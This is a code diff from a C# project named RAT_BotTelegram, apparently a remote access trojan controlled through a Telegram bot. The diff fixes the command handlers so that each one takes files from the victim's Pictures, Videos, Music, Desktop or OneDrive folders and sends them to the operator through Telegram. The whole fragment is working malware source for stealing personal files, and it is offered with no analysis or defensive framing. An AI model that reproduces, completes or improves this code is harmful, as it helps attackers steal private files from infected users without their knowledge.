@@ -327,40 +327,40 @@ namespace RAT_BotTelegram {
             switch (callbackQuery.Data) {
                 // User
                 case "GetPictures":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Pictures");
                     break;
                 case "GetVideos":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Videos");
                     break;
                 case "GetDocument":
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
                     break;
                 case "GetMusic":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Music");
                     break;
                 case "GetDownload":
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
                     break;
                 case "GetDesktop":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Desktop");
                     break;
 
                 // OneDrive
 
                 case "GetPicturesO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
                 case "GetVideosO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
                 case "GetDocumentO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
                 case "GetMusicO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
                 case "GetgetAllO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
                // Other
 
